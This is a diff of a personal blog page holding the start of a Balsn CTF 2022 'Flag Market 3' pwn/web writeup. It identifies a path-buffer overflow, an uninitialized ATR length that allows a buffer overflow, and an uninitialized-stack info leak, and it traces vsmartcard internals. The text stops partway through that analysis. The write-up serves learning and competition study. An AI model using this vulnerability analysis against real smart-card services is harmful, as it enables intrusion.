@@ -1,467 +1,292 @@
-<!DOCTYPE html>
-<html lang="en">
-
-    <head>		<title>Balsn CTF 2022 - Flag Market Writeup &ndash; piers&#39;s blog</title>
-		<meta name="description" content="My personal blog on the journey of learning how2pwn">
-		<link rel="apple-touch-icon" sizes="76x76" href="/apple-touch-icon.png">
-		<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-		<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
-		<link rel="manifest" href="/site.webmanifest">
-		<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
-		<meta name="msapplication-TileColor" content="#da532c">
-		<meta name="theme-color" content="#ffffff">
-		<meta name="viewport" content="width=device-width, initial-scale=1">
-		<meta charset="utf-8"/>
-
-		
-		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" integrity="sha512-HK5fgLBL+xu6dm/Ii3z4xhlSUyZgTT9tuc/hSrtw6uzJOvgRr2a9jyxxT1ely+B+xFAmJKVSTbpM/CuL7qxO8w==" crossorigin="anonymous" />
-
-		
-		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/academicons/1.9.1/css/academicons.min.css" integrity="sha512-b1ASx0WHgVFL5ZQhTgiPWX+68KjS38Jk87jg7pe+qC7q9YkEtFq0z7xCglv7qGIs/68d3mAp+StfC8WKC5SSAg==" crossorigin="anonymous" />
-
-		
-		<link rel="stylesheet" href="https://piers-n.github.io/css/colour/gruvbox-dark.css">
-		<link rel="stylesheet" href="https://piers-n.github.io/css/colour/dark-mode.css">
-		<link rel="stylesheet" href="https://piers-n.github.io/css/risotto.css">
-		<link rel="stylesheet" href="https://piers-n.github.io/css/custom.css">
-</head>
-
-    <body>
-        <div class="page">
-
-            <header class="page__header"><h1 class="page__logo"><a href="https://piers-n.github.io/" class="page__logo-inner">piers&#39;s blog</a></h1>
-<nav class="page__nav main-nav">
-    <ul>
-    
-    
-    <li class="main-nav__item"><a class="nav-main-item" href="/about/" title="">About</a></li>
-    
-    <li class="main-nav__item"><a class="nav-main-item active" href="/post/" title="Posts">Posts</a></li>
-    
-    </ul>
-</nav>
-
-</header>
-
-            <section class="page__body">
-    <header class="content__header">
-        <h1>Balsn CTF 2022 - Flag Market Writeup</h1>
-    </header>
-    <div class="content__body">
-        <p>A very cool challenge that has combined both pwn and web</p>
-<h2 id="lfyg-flag-market-3-lfyg"><lf><yg> Flag Market 3 </lf></yg></h2>
-<p><img src="/images/flagmarket/desc.png" alt="desc"></p>
-<p>The challenge is running on ubuntu 20.04 with full protection<br>
-In the last part we have to get a shell on this Flag Market service</p>
-<h3 id="lfyg-identify-the-vulnerabilities-lfyg"><lf><yg> Identify the vulnerabilities </lf></yg></h3>
-<p>The first bug exists in connection_handler function</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> request[MAX_REQ_BUF] <span style="color:#f92672">=</span> {};
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> method[MAX_BUF] <span style="color:#f92672">=</span> {};
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> path[MAX_BUF] <span style="color:#f92672">=</span> {};
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> port[MAX_BUF] <span style="color:#f92672">=</span> {};
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> host[MAX_BUF] <span style="color:#f92672">=</span> {};
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>    n <span style="color:#f92672">=</span> sscanf(request, <span style="color:#e6db74">&#34;%s /%s HTTP/1.1&#34;</span>, method, path);  
-</span></span></code></pre></div><p><red> MAX_REQ_BUF is 1024 and MAX_BUF is 384</red>. Therefore we can overflown the path buffer into port and host<br>
-<red> This will affect the connection_backend function</red>. We can control what the service connects to <br>
-The second bug exists in card_status function</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>    LONG rv;
-</span></span><span style="display:flex;"><span>    DWORD readersLen;
-</span></span><span style="display:flex;"><span>    DWORD atrLen;
-</span></span><span style="display:flex;"><span>    DWORD pdwState;
-</span></span><span style="display:flex;"><span>    DWORD pdwProtocol;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    readersLen <span style="color:#f92672">=</span> SCARD_AUTOALLOCATE;
-</span></span><span style="display:flex;"><span>    rv <span style="color:#f92672">=</span> SCardStatus(<span style="color:#f92672">*</span>hCard, readersBuf, <span style="color:#f92672">&amp;</span>readersLen, <span style="color:#f92672">&amp;</span>pdwState, <span style="color:#f92672">&amp;</span>pdwProtocol, atrBuf, <span style="color:#f92672">&amp;</span>atrLen);
-</span></span></code></pre></div><p><red> The atrLen is uninitialized</red>. We can overflow the atrBuf.<br>
-The third bug exists in do_transmit function</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>    BYTE transmitBuf[MAX_BUF];
-</span></span><span style="display:flex;"><span>    DWORD transmitLen;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    BYTE cmd1[] <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0xA4</span>, <span style="color:#ae81ff">0x04</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x10</span>, <span style="color:#ae81ff">0xCA</span>, <span style="color:#ae81ff">0x44</span>, <span style="color:#ae81ff">0x6F</span>, <span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0xD3</span>, <span style="color:#ae81ff">0x52</span>, <span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0xAA</span>, <span style="color:#ae81ff">0x06</span>, <span style="color:#ae81ff">0xC6</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0xF5</span>, <span style="color:#ae81ff">0x57</span>, <span style="color:#ae81ff">0x6B</span>, <span style="color:#ae81ff">0x3E</span> };
-</span></span><span style="display:flex;"><span>    rv <span style="color:#f92672">=</span> transmit(<span style="color:#f92672">*</span>hCard, cmd1, <span style="color:#66d9ef">sizeof</span>(cmd1), transmitBuf, <span style="color:#f92672">&amp;</span>transmitLen);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (rv <span style="color:#f92672">!=</span> SCARD_S_SUCCESS)
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> rv;
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (check_transmit(transmitBuf, transmitLen) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>)
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    BYTE cmd2[] <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0xB2</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x40</span> };
-</span></span><span style="display:flex;"><span>    rv <span style="color:#f92672">=</span> transmit(<span style="color:#f92672">*</span>hCard, cmd2, <span style="color:#66d9ef">sizeof</span>(cmd2), transmitBuf, <span style="color:#f92672">&amp;</span>transmitLen);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (rv <span style="color:#f92672">!=</span> SCARD_S_SUCCESS)
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> rv;
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (check_transmit(transmitBuf, transmitLen) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>)
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    memcpy(credit, transmitBuf, <span style="color:#66d9ef">sizeof</span>(Card));
-</span></span></code></pre></div><p><red> transmitBuf is uninitialized</red>. So if we dont fill the transmitBuf too much there will be address on stack copied to credit struct.<br>
-This can help us leak some address.</p>
-<h3 id="lfyg-understanding-the-internal-vsmartcard-lfyg"><lf><yg> Understanding the internal vsmartcard </lf></yg></h3>
-<p>The important function we have to look into first is <yg>SCardStatus</yg>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>PCSC_API LONG <span style="color:#a6e22e">SCardStatus</span>(SCARDHANDLE hCard, LPSTR mszReaderName, LPDWORD pcchReaderLen, LPDWORD pdwState, LPDWORD pdwProtocol, LPBYTE pbAtr, LPDWORD pcbAtrLen)
-</span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>    LONG r;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    SET_R_TEST( handle2reader(hCard, mszReaderName, pcchReaderLen));
-</span></span><span style="display:flex;"><span>    SET_R_TEST( handle2atr(hCard, pbAtr, pcbAtrLen));
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>err:
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r;
-</span></span><span style="display:flex;"><span>}  
-</span></span></code></pre></div><p>It will call handle2atr function, and then this function will call <yg>IFDHICCPresence</yg> and <yg>IFDHGetCapabilities</yg>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>    SET_R_TEST( responsecode2long(
-</span></span><span style="display:flex;"><span>                IFDHICCPresence(Lun)));
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    SET_R_TEST( autoallocate(pbAtr, pcbAtrLen, MAX_ATR_SIZE, (<span style="color:#66d9ef">void</span> <span style="color:#f92672">**</span>) <span style="color:#f92672">&amp;</span>atr));
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>atr) {
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">/* caller wants to have the length */</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>pcbAtrLen <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span> _atr;
-</span></span><span style="display:flex;"><span>        atr <span style="color:#f92672">=</span> _atr;
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    SET_R_TEST( responsecode2long(
-</span></span><span style="display:flex;"><span>                IFDHGetCapabilities (Lun, TAG_IFD_ATR, pcbAtrLen, atr)));
-</span></span></code></pre></div><p><yg>IFDHICCPresence</yg> will call <yg>vicc_present</yg>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>    <span style="color:#66d9ef">switch</span> (vicc_present(ctx[slot])) {
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">:</span>
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> IFD_ICC_NOT_PRESENT;
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">:</span>
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> IFD_ICC_PRESENT;
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
-</span></span><span style="display:flex;"><span>            Log1(PCSC_LOG_ERROR, <span style="color:#e6db74">&#34;Could not get ICC state&#34;</span>);
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> IFD_COMMUNICATION_ERROR;
-</span></span><span style="display:flex;"><span>    }
-</span></span></code></pre></div><p><yg>IFDHGetCapabilities</yg> will call <yg>vicc_getatr</yg>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>    size <span style="color:#f92672">=</span> vicc_getatr(ctx[slot], <span style="color:#f92672">&amp;</span>atr);
-</span></span></code></pre></div><p><yg>vicc_connect</yg> was patched from:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>vicc_connect(ctx, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>) <span style="color:#f92672">||</span> vicc_getatr(ctx, <span style="color:#f92672">&amp;</span>atr) <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>)
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
-</span></span></code></pre></div><p>to:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>vicc_connect(ctx, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">0</span>) <span style="color:#f92672">||</span> vicc_getatr(ctx, <span style="color:#f92672">&amp;</span>atr) <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>)
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
-</span></span></code></pre></div><p><yg>vicc_connect</yg> will create a listening server for vscard reading:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>ctx<span style="color:#f92672">-&gt;</span>hostname) {
-</span></span><span style="display:flex;"><span>            <span style="color:#75715e">/* server mode, try to accept a client */</span>
-</span></span><span style="display:flex;"><span>            ctx<span style="color:#f92672">-&gt;</span>client_sock <span style="color:#f92672">=</span> waitforclient(ctx<span style="color:#f92672">-&gt;</span>server_sock, secs, usecs);
+<!doctype html><html lang=en><head><title>Balsn CTF 2022 - Flag Market Writeup &ndash; piers's blog</title><meta name=description content="My personal blog on the journey of learning how2pwn"><link rel=apple-touch-icon sizes=76x76 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#ffffff"><meta name=viewport content="width=device-width,initial-scale=1"><meta charset=utf-8><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css integrity="sha512-HK5fgLBL+xu6dm/Ii3z4xhlSUyZgTT9tuc/hSrtw6uzJOvgRr2a9jyxxT1ely+B+xFAmJKVSTbpM/CuL7qxO8w==" crossorigin=anonymous><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/academicons/1.9.1/css/academicons.min.css integrity="sha512-b1ASx0WHgVFL5ZQhTgiPWX+68KjS38Jk87jg7pe+qC7q9YkEtFq0z7xCglv7qGIs/68d3mAp+StfC8WKC5SSAg==" crossorigin=anonymous><link rel=stylesheet href=https://piers-n.github.io/css/colour/gruvbox-dark.css><link rel=stylesheet href=https://piers-n.github.io/css/colour/dark-mode.css><link rel=stylesheet href=https://piers-n.github.io/css/risotto.css><link rel=stylesheet href=https://piers-n.github.io/css/custom.css></head><body><div class=page><header class=page__header><h1 class=page__logo><a href=https://piers-n.github.io/ class=page__logo-inner>piers's blog</a></h1><nav class="page__nav main-nav"><ul><li class=main-nav__item><a class=nav-main-item href=/about/ title>About</a></li><li class=main-nav__item><a class="nav-main-item active" href=/post/ title=Posts>Posts</a></li></ul></nav></header><section class=page__body><header class=content__header><h1>Balsn CTF 2022 - Flag Market Writeup</h1></header><div class=content__body><p>A very cool challenge that has combined both pwn and web</p><h2 id=lfyg-flag-market-3-lfyg><lf><yg>Flag Market 3</lf></yg></h2><p><img src=/images/flagmarket/desc.png alt=desc></p><p>The challenge is running on ubuntu 20.04 with full protection<br>In the last part we have to get a shell on this Flag Market service</p><h3 id=lfyg-identify-the-vulnerabilities-lfyg><lf><yg>Identify the vulnerabilities</lf></yg></h3><p>The first bug exists in connection_handler function</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>    <span style=color:#66d9ef>char</span> request[MAX_REQ_BUF] <span style=color:#f92672>=</span> {};
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> method[MAX_BUF] <span style=color:#f92672>=</span> {};
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> path[MAX_BUF] <span style=color:#f92672>=</span> {};
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> port[MAX_BUF] <span style=color:#f92672>=</span> {};
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> host[MAX_BUF] <span style=color:#f92672>=</span> {};
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>    n <span style=color:#f92672>=</span> <span style=color:#a6e22e>sscanf</span>(request, <span style=color:#e6db74>&#34;%s /%s HTTP/1.1&#34;</span>, method, path);  
+</span></span></code></pre></div><p><red>MAX_REQ_BUF is 1024 and MAX_BUF is 384</red>. Therefore we can overflown the path buffer into port and host<br><red>This will affect the connection_backend function</red>. We can control what the service connects to<br>The second bug exists in card_status function</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>    LONG rv;
+</span></span><span style=display:flex><span>    DWORD readersLen;
+</span></span><span style=display:flex><span>    DWORD atrLen;
+</span></span><span style=display:flex><span>    DWORD pdwState;
+</span></span><span style=display:flex><span>    DWORD pdwProtocol;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    readersLen <span style=color:#f92672>=</span> SCARD_AUTOALLOCATE;
+</span></span><span style=display:flex><span>    rv <span style=color:#f92672>=</span> <span style=color:#a6e22e>SCardStatus</span>(<span style=color:#f92672>*</span>hCard, readersBuf, <span style=color:#f92672>&amp;</span>readersLen, <span style=color:#f92672>&amp;</span>pdwState, <span style=color:#f92672>&amp;</span>pdwProtocol, atrBuf, <span style=color:#f92672>&amp;</span>atrLen);
+</span></span></code></pre></div><p><red>The atrLen is uninitialized</red>. We can overflow the atrBuf.<br>The third bug exists in do_transmit function</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>    BYTE transmitBuf[MAX_BUF];
+</span></span><span style=display:flex><span>    DWORD transmitLen;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    BYTE cmd1[] <span style=color:#f92672>=</span> { <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0xA4</span>, <span style=color:#ae81ff>0x04</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x10</span>, <span style=color:#ae81ff>0xCA</span>, <span style=color:#ae81ff>0x44</span>, <span style=color:#ae81ff>0x6F</span>, <span style=color:#ae81ff>0x66</span>, <span style=color:#ae81ff>0xD3</span>, <span style=color:#ae81ff>0x52</span>, <span style=color:#ae81ff>0x89</span>, <span style=color:#ae81ff>0x58</span>, <span style=color:#ae81ff>0xAA</span>, <span style=color:#ae81ff>0x06</span>, <span style=color:#ae81ff>0xC6</span>, <span style=color:#ae81ff>0xEB</span>, <span style=color:#ae81ff>0xF5</span>, <span style=color:#ae81ff>0x57</span>, <span style=color:#ae81ff>0x6B</span>, <span style=color:#ae81ff>0x3E</span> };
+</span></span><span style=display:flex><span>    rv <span style=color:#f92672>=</span> <span style=color:#a6e22e>transmit</span>(<span style=color:#f92672>*</span>hCard, cmd1, <span style=color:#66d9ef>sizeof</span>(cmd1), transmitBuf, <span style=color:#f92672>&amp;</span>transmitLen);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (rv <span style=color:#f92672>!=</span> SCARD_S_SUCCESS)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> rv;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>check_transmit</span>(transmitBuf, transmitLen) <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span>)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    BYTE cmd2[] <span style=color:#f92672>=</span> { <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0xB2</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x40</span> };
+</span></span><span style=display:flex><span>    rv <span style=color:#f92672>=</span> <span style=color:#a6e22e>transmit</span>(<span style=color:#f92672>*</span>hCard, cmd2, <span style=color:#66d9ef>sizeof</span>(cmd2), transmitBuf, <span style=color:#f92672>&amp;</span>transmitLen);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (rv <span style=color:#f92672>!=</span> SCARD_S_SUCCESS)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> rv;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>check_transmit</span>(transmitBuf, transmitLen) <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span>)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>memcpy</span>(credit, transmitBuf, <span style=color:#66d9ef>sizeof</span>(Card));
+</span></span></code></pre></div><p><red>transmitBuf is uninitialized</red>. So if we dont fill the transmitBuf too much there will be address on stack copied to credit struct.<br>This can help us leak some address.</p><h3 id=lfyg-understanding-the-internal-vsmartcard-lfyg><lf><yg>Understanding the internal vsmartcard</lf></yg></h3><p>The important function we have to look into first is <yg>SCardStatus</yg>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>PCSC_API LONG <span style=color:#a6e22e>SCardStatus</span>(SCARDHANDLE hCard, LPSTR mszReaderName, LPDWORD pcchReaderLen, LPDWORD pdwState, LPDWORD pdwProtocol, LPBYTE pbAtr, LPDWORD pcbAtrLen)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    LONG r;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>SET_R_TEST</span>( <span style=color:#a6e22e>handle2reader</span>(hCard, mszReaderName, pcchReaderLen));
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>SET_R_TEST</span>( <span style=color:#a6e22e>handle2atr</span>(hCard, pbAtr, pcbAtrLen));
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>err:
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> r;
+</span></span><span style=display:flex><span>}  
+</span></span></code></pre></div><p>It will call handle2atr function, and then this function will call <yg>IFDHICCPresence</yg> and <yg>IFDHGetCapabilities</yg>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>    <span style=color:#a6e22e>SET_R_TEST</span>( <span style=color:#a6e22e>responsecode2long</span>(
+</span></span><span style=display:flex><span>                <span style=color:#a6e22e>IFDHICCPresence</span>(Lun)));
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>SET_R_TEST</span>( <span style=color:#a6e22e>autoallocate</span>(pbAtr, pcbAtrLen, MAX_ATR_SIZE, (<span style=color:#66d9ef>void</span> <span style=color:#f92672>**</span>) <span style=color:#f92672>&amp;</span>atr));
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>atr) {
+</span></span><span style=display:flex><span>        <span style=color:#75715e>/* caller wants to have the length */</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>*</span>pcbAtrLen <span style=color:#f92672>=</span> <span style=color:#66d9ef>sizeof</span> _atr;
+</span></span><span style=display:flex><span>        atr <span style=color:#f92672>=</span> _atr;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>SET_R_TEST</span>( <span style=color:#a6e22e>responsecode2long</span>(
+</span></span><span style=display:flex><span>                <span style=color:#a6e22e>IFDHGetCapabilities</span> (Lun, TAG_IFD_ATR, pcbAtrLen, atr)));
+</span></span></code></pre></div><p><yg>IFDHICCPresence</yg> will call <yg>vicc_present</yg>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>    <span style=color:#66d9ef>switch</span> (<span style=color:#a6e22e>vicc_present</span>(ctx[slot])) {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>case</span> <span style=color:#ae81ff>0</span><span style=color:#f92672>:</span>
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> IFD_ICC_NOT_PRESENT;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>case</span> <span style=color:#ae81ff>1</span><span style=color:#f92672>:</span>
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> IFD_ICC_PRESENT;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>default</span><span style=color:#f92672>:</span>
+</span></span><span style=display:flex><span>            <span style=color:#a6e22e>Log1</span>(PCSC_LOG_ERROR, <span style=color:#e6db74>&#34;Could not get ICC state&#34;</span>);
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> IFD_COMMUNICATION_ERROR;
+</span></span><span style=display:flex><span>    }
+</span></span></code></pre></div><p><yg>IFDHGetCapabilities</yg> will call <yg>vicc_getatr</yg>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>    size <span style=color:#f92672>=</span> <span style=color:#a6e22e>vicc_getatr</span>(ctx[slot], <span style=color:#f92672>&amp;</span>atr);
+</span></span></code></pre></div><p><yg>vicc_connect</yg> was patched from:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>vicc_connect</span>(ctx, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>) <span style=color:#f92672>||</span> <span style=color:#a6e22e>vicc_getatr</span>(ctx, <span style=color:#f92672>&amp;</span>atr) <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>0</span>)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
+</span></span></code></pre></div><p>to:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>vicc_connect</span>(ctx, <span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>0</span>) <span style=color:#f92672>||</span> <span style=color:#a6e22e>vicc_getatr</span>(ctx, <span style=color:#f92672>&amp;</span>atr) <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>0</span>)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
+</span></span></code></pre></div><p><yg>vicc_connect</yg> will create a listening server for vscard reading:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(<span style=color:#f92672>!</span>ctx<span style=color:#f92672>-&gt;</span>hostname) {
